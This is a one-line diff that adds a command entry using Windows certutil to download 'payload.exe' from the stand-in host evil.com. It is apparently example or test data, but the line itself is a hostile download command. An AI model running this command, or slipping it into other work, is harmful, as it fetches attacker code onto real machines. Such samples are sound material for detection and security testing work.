@@ -1,0 +1,1 @@
+execute: certutil -urlcache -split -f http://evil.com/payload.exe payload.exe
